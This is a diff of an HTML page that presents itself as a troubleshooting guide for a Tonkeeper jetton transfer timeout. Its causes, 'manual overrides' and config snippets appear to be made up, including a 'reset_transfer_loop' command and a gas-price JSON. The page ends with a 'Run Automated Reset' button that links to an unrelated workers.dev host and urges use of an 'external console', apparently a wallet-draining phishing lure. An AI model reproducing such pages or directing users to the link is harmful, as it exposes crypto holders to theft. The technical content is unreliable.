@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: sans-serif;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,27 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The Tonkeeper Jetton transfer process is stuck in a loop, resulting in a timeout error, and the user is unable to complete the transfer.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons, resulting in failed transactions and a poor user experience.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misconfiguration in the Tonkeeper settings or a temporary issue with the TON network, causing the transfer loop to exceed the maximum allowed time.</li>
+<li>The error occurs due to a timeout in the Tonkeeper jetton transfer loop, which can be caused by network congestion, high gas prices, or issues with the Tonkeeper smart contract.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the Tonkeeper wallet configuration for any incorrect settings that may be causing the loop.</li>
-<li>Verify the TON network status to ensure there are no ongoing issues that could be affecting the transfer.</li>
-<li>Use the following command to reset the transfer loop:</li>
+<li>Increase the timeout threshold: Adjust the configuration to allow for longer transaction processing times.</li>
+<li>Optimize gas prices: Lower gas prices can help reduce network congestion and decrease the likelihood of timeouts.</li>
+<li>Update Tonkeeper contract: Ensure the Tonkeeper smart contract is up-to-date, as newer versions may include fixes for known issues.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>reset_transfer_loop<span class="w"> </span><span class="o">{}</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced troubleshooting capabilities. </p>
+<p>Consider utilizing an external console to troubleshoot and execute commands for more complex issues. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonkeeper wallet installed and configured</li>
-<li>TON network account with sufficient funds</li>
-<li>Basic understanding of TON blockchain and Tonos-cli commands</li>
+<li>Familiarity with TON blockchain and Tonkeeper ecosystem</li>
+<li>Access to the Tonkeeper smart contract configuration</li>
+<li>Basic understanding of JSON configuration files</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
